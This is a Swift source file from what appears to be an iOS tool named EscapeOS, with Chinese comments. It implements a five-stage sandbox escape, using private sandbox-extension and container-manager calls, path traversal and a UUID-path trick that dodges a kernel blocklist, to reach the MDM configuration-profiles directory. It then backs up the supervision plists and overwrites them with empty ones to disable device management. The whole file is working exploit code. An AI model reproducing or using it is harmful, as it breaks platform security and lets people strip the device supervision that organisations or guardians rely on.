import Foundation
import Darwin
import XPC

//
//  MDMBypassService.swift
//  EscapeOS
//
//  v0.3.228：MDM 沙盒逃逸 + 配置文件管理（移植自 mond-main MDM 绕过，个人测试用途）。
//
//  iOS 26.5/26.6 对 configurationprofiles SystemGroup 拒绝签发沙盒扩展
//  （bad_query 返回 -4 / copy_sandbox_token 返回 NULL）。mond 的绕过思路：
//    A. sandbox_extension_issue_file 直发（libsystem_sandbox.dylib）
//    B. container_object_sandbox_extension_activate（cmg-activate，绕过 copy_sandbox_token）
//    C/D. bad_query + mobilegestaltcache 标识重定向 / 自动识别
//    E. UUID 路径 bypass（container_object_get_path 返回不含 "configurationprofiles"
//       字符串的 UUID 容器路径，绕内核黑名单）
//  每层激活后用 Darwin.open 真实验证目录可达性，失败自动降级下一层。
//

enum MDMPaths {
    static let profiles =
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles"
    static let profilesDir =
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/"

    /// MDM 监管核心配置文件（mond knownFiles）
    static let knownFiles = [
        "CloudConfigurationDetails.plist",
        "ClientTruth.plist",
        "CloudConfigurationSetAsideDetails.plist",
        "MDM.plist",
        "MCProfileEvents.plist",
        "MDMEvents.plist",
        "ProfileTruth.plist",
        "MCFeatureOverrides.plist",
        "ProfilePreferences.plist",
    ]

    /// 空字典 plist（neuter 覆盖用）
    static let emptyPlist = """
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0"><dict/></plist>
    """
}

/// 逃逸结果：成功方式 + 可用目标路径（UUID 路径优先）
struct MDMEscapeResult {
    let method: String
    let targetPath: String
}

// MARK: - 私有 FFI typealias

private typealias mdm_create_fn   = @convention(c) () -> UnsafeMutableRawPointer?
private typealias mdm_activate_fn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
private typealias mdm_free_fn     = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias mdm_u64_fn      = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private typealias mdm_bool_fn     = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
private typealias mdm_obj_fn      = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
private typealias mdm_str_fn      = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
private typealias mdm_res_fn      = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias mdm_path_fn     = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?

private func mdm_sym<T>(_ h: UnsafeMutableRawPointer, _ name: String, as: T.Type) -> T? {
    guard let s = dlsym(h, name) else { return nil }
    return unsafeBitCast(s, to: T.self)
}

// MARK: - Method A：sandbox_extension_issue_file（直发，libsystem_sandbox.dylib）

func mdm_sandbox_extension_issue_file(path: String) -> String? {
    typealias sbx_issue_func = @convention(c) (UnsafePointer<CChar>?, UnsafePointer<CChar>?, Int32, Int32) -> UnsafeMutablePointer<CChar>?
    guard let lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }
    guard let sym = dlsym(lib, "sandbox_extension_issue_file") else { return nil }
    let issue = unsafeBitCast(sym, to: sbx_issue_func.self)
    guard let ptr = issue("com.apple.app-sandbox.read-write", path, 0, 0) else { return nil }
    defer { free(ptr) }
    return String(cString: ptr)
}

func mdm_sandbox_extension_consume(_ token: String) -> Int64? {
    typealias sbx_consume_func = @convention(c) (UnsafePointer<CChar>?) -> Int64
    guard let lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }
    guard let sym = dlsym(lib, "sandbox_extension_consume") else { return nil }
    let consume = unsafeBitCast(sym, to: sbx_consume_func.self)
    let r = consume(token)
    return r >= 0 ? r : nil
}

// MARK: - Method B：cmg-activate（container_object_sandbox_extension_activate + 验证）

private func try_activate_mdm(lib: UnsafeMutableRawPointer,
                              groupID: String = "systemgroup.com.apple.configurationprofiles",
                              domain: String) -> String? {
    guard
        let create     = mdm_sym(lib, "container_query_create",                     as: mdm_create_fn.self),
        let activate   = mdm_sym(lib, "container_object_sandbox_extension_activate", as: mdm_activate_fn.self),
        let free       = mdm_sym(lib, "container_query_free",                        as: mdm_free_fn.self),
        let set_cls    = mdm_sym(lib, "container_query_set_class",                   as: mdm_u64_fn.self),
        let set_tran   = mdm_sym(lib, "container_query_set_transient",               as: mdm_bool_fn.self),
        let set_gids   = mdm_sym(lib, "container_query_set_group_identifiers",       as: mdm_obj_fn.self),
        let set_plat   = mdm_sym(lib, "container_query_operation_set_platform",      as: mdm_u64_fn.self),
        let set_flag   = mdm_sym(lib, "container_query_operation_set_flags",         as: mdm_u64_fn.self),
        let set_part   = mdm_sym(lib, "container_query_operation_set_part",          as: mdm_u64_fn.self),
        let get_res    = mdm_sym(lib, "container_query_get_single_result",           as: mdm_res_fn.self)
    else { return nil }

    let set_domain = mdm_sym(lib, "container_query_operation_set_part_domain", as: mdm_str_fn.self)

    guard let q = create() else { return nil }
    set_cls(q, 13)
    set_tran(q, false)
    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, groupID)
    set_gids(q, arr)
    set_plat(q, 2)
    set_flag(q, (1 << 32) | (1 << 39))
    set_part(q, 3)
    if !domain.isEmpty {
        domain.withCString { set_domain?(q, $0) }
    }

    guard let res = get_res(q) else {
        free(q)
        return nil
    }
    let ok = activate(res, true)
    free(q)
    guard ok else { return nil }

    // 关键验证：activate 返回 true 不保证覆盖 ConfigurationProfiles，用 Darwin.open 实测
    let dirFd = MDMPaths.profiles.withCString { Darwin.open($0, O_RDONLY | O_DIRECTORY | O_CLOEXEC) }
    if dirFd >= 0 {
        Darwin.close(dirFd)
        return MDMPaths.profiles
    }
    return nil
}

/// cmg-activate 多策略（2 groupID × 3 domain 路径穿越）
func mdm_grant_access() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }

    let fullDomain = "../../../../../../../../\(MDMPaths.profiles)"
    let groupIDs = [
        "systemgroup.com.apple.mobilegestaltcache",
        "systemgroup.com.apple.configurationprofiles",
    ]
    let domains = [fullDomain, "../ConfigurationProfiles", ""]

    for gID in groupIDs {
        for d in domains {
            if let path = try_activate_mdm(lib: lib, groupID: gID, domain: d) {
                return path
            }
        }
    }
    return nil
}

// MARK: - Method E：UUID 路径解析（container_object_get_path——绕内核黑名单）

func mdm_resolve_uuid_path() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }

    guard
        let create   = mdm_sym(lib, "container_query_create",             as: mdm_create_fn.self),
        let free     = mdm_sym(lib, "container_query_free",               as: mdm_free_fn.self),
        let set_cls  = mdm_sym(lib, "container_query_set_class",          as: mdm_u64_fn.self),
        let set_tran = mdm_sym(lib, "container_query_set_transient",      as: mdm_bool_fn.self),
        let set_gids = mdm_sym(lib, "container_query_set_group_identifiers", as: mdm_obj_fn.self),
        let set_plat = mdm_sym(lib, "container_query_operation_set_platform", as: mdm_u64_fn.self),
        let set_flag = mdm_sym(lib, "container_query_operation_set_flags", as: mdm_u64_fn.self),
        let get_res  = mdm_sym(lib, "container_query_get_single_result",  as: mdm_res_fn.self),
        let get_path = mdm_sym(lib, "container_object_get_path",          as: mdm_path_fn.self)
    else { return nil }

    guard let q = create() else { return nil }
    set_cls(q, 13)
    set_tran(q, false)

    let arr = xpc_array_create(nil, 0)
    "systemgroup.com.apple.configurationprofiles".withCString { ptr in
        xpc_array_set_string(arr, 0, ptr)
    }
    set_gids(q, arr)
    set_plat(q, 2)
    set_flag(q, 1 << 32)

    guard let res = get_res(q), let c_path = get_path(res) else {
        free(q)
        return nil
    }
    let uuidPath = String(cString: c_path)
    free(q)
    return uuidPath
}

// MARK: - 五层策略链

enum MDMEscape {
    /// 依序尝试 5 层逃逸策略，返回首个通过 Darwin.open 实测可达的方式。
    static func run(log: @escaping (String) -> Void = { _ in }) -> MDMEscapeResult? {
        // A. sandbox_extension_issue_file 直发
        if let token = mdm_sandbox_extension_issue_file(path: MDMPaths.profilesDir),
           mdm_sandbox_extension_consume(token) != nil {
            if openVerified(MDMPaths.profiles) {
                log("Method A 成功：sandbox_extension_issue_file")
                return MDMEscapeResult(method: "sbx-issue-dir", targetPath: MDMPaths.profiles)
            }
        }
        log("Method A（sbx-issue-file）失败")

        // B. cmg-activate
        if mdm_grant_access() != nil, openVerified(MDMPaths.profiles) {
            log("Method B 成功：cmg-activate")
            return MDMEscapeResult(method: "cmg-activate", targetPath: MDMPaths.profiles)
        }
        log("Method B（cmg-activate）失败")

        // C/D. bad_query（EscapeOS 内置 SandboxEscape 封装）
        let escape = SandboxEscape()
        do {
            _ = try escape.consume(path: MDMPaths.profilesDir,
                                   groupIdentifier: "systemgroup.com.apple.mobilegestaltcache",
                                   isGroup: true, create: true)
            if openVerified(MDMPaths.profiles) {
                log("Method C 成功：bad_query + gestaltcache 重定向")
                return MDMEscapeResult(method: "bad_query-mg", targetPath: MDMPaths.profiles)
            }
        } catch { log("Method C（bad_query-mg）失败：\(error.localizedDescription)") }

        do {
            _ = try escape.consume(path: MDMPaths.profilesDir, isGroup: false, create: true)
            if openVerified(MDMPaths.profiles) {
                log("Method D 成功：bad_query 自动识别")
                return MDMEscapeResult(method: "bad_query", targetPath: MDMPaths.profiles)
            }
        } catch { log("Method D（bad_query）失败：\(error.localizedDescription)") }

        // E. UUID 路径 bypass（iOS 26.5+ 关键——路径不含 configurationprofiles 字符串）
        if let root = mdm_resolve_uuid_path() {
            let uuidTarget = root.hasSuffix("/")
                ? root + "Library/ConfigurationProfiles/"
                : root + "/Library/ConfigurationProfiles/"
            do {
                _ = try escape.consume(path: uuidTarget,
                                       groupIdentifier: "systemgroup.com.apple.mobilegestaltcache",
                                       isGroup: true, create: true)
                if openVerified(uuidTarget) {
                    log("Method E 成功：UUID 路径 bypass（\(uuidTarget)）")
                    return MDMEscapeResult(method: "bad_query-uuid", targetPath: uuidTarget)
                }
            } catch { log("Method E（bad_query-uuid）失败：\(error.localizedDescription)") }
        } else {
            log("Method E：container_object_get_path 未返回 UUID 路径")
        }

        log("全部 5 层逃逸策略失败")
        return nil
    }

    /// Darwin.open 实测目录可达
    static func openVerified(_ path: String) -> Bool {
        let fd = path.withCString { Darwin.open($0, O_RDONLY | O_DIRECTORY | O_CLOEXEC) }
        if fd >= 0 { Darwin.close(fd); return true }
        return false
    }
}

// MARK: - 备份 / 清除（neuter）/ 还原

enum MDMBypass {

    static var backupRoot: URL {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("SystemFileBackups/MDM", isDirectory: true)
    }

    static func hasBackups() -> Bool {
        guard let contents = try? FileManager.default.contentsOfDirectory(atPath: backupRoot.path) else { return false }
        return !contents.isEmpty
    }

    /// 对单个已知 MDM 文件：读（备份）→ 空字典覆盖。返回状态。
    /// - Returns: .overwritten / .notPresent / .denied(String)
    enum FileAction { case overwritten, notPresent, denied(String) }

    static func neuterOne(fileName: String, targetDir: String, backupRoot: URL,
                          log: @escaping (String) -> Void = { _ in }) -> FileAction {
        let fm = FileManager.default
        try? fm.createDirectory(at: backupRoot, withIntermediateDirectories: true)

        let filePath = targetDir.hasSuffix("/")
            ? targetDir + fileName
            : targetDir + "/" + fileName

        // 读 + 备份
        let rfd = filePath.withCString { Darwin.open($0, O_RDONLY | O_CLOEXEC | O_NOFOLLOW) }
        if rfd >= 0 {
            let backupPath = backupRoot.appendingPathComponent(fileName).path
            let bfd = backupPath.withCString { Darwin.open($0, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0o644) }
            if bfd >= 0 {
                var buf = [UInt8](repeating: 0, count: 8192)
                var n: Int
                repeat {
                    n = Darwin.read(rfd, &buf, buf.count)
                    if n > 0 { _ = Darwin.write(bfd, &buf, n) }
                } while n > 0
                Darwin.close(bfd)
            }
            Darwin.close(rfd)

            // 空字典覆盖
            let empty = Data(MDMPaths.emptyPlist.utf8)
            let wfd = filePath.withCString { Darwin.open($0, O_WRONLY | O_TRUNC | O_CLOEXEC | O_NOFOLLOW) }
            if wfd >= 0 {
                let ok = empty.withUnsafeBytes { ptr -> Bool in
                    Darwin.write(wfd, ptr.baseAddress!, empty.count) == empty.count
                }
                Darwin.close(wfd)
                log("✓ 覆盖 \(fileName)")
                return ok ? .overwritten : .denied(String(cString: strerror(errno)))
            }
            return .denied(String(cString: strerror(errno)))
        }
        let e = errno
        if e == ENOENT {
            log("○ \(fileName) 未预置（未加入 MDM 监管）")
            return .notPresent
        }
        log("✗ 打开 \(fileName) 失败：\(String(cString: strerror(e)))")
        return .denied(String(cString: strerror(e)))
    }

    /// 从备份还原全部文件
    static func restoreAll(targetDir: String) -> (restored: Int, error: String?) {
        let fm = FileManager.default
        guard let backupFiles = try? fm.contentsOfDirectory(atPath: backupRoot.path), !backupFiles.isEmpty else {
            return (0, "未找到任何 MDM 备份文件")
        }
        var restored = 0
        var lastError: String?
        for filename in backupFiles {
            let backupFileURL = backupRoot.appendingPathComponent(filename)
            guard let backupData = try? Data(contentsOf: backupFileURL) else { continue }
            let target = targetDir.hasSuffix("/")
                ? targetDir + filename
                : targetDir + "/" + filename
            let wfd = target.withCString { Darwin.open($0, O_WRONLY | O_TRUNC | O_CREAT | O_CLOEXEC, 0o644) }
            if wfd >= 0 {
                let ok = backupData.withUnsafeBytes { ptr -> Bool in
                    Darwin.write(wfd, ptr.baseAddress!, backupData.count) == backupData.count
                }
                Darwin.close(wfd)
                if ok { restored += 1 } else { lastError = String(cString: strerror(errno)) }
            } else {
                lastError = String(cString: strerror(errno))
            }
        }
        return (restored, lastError)
    }
}
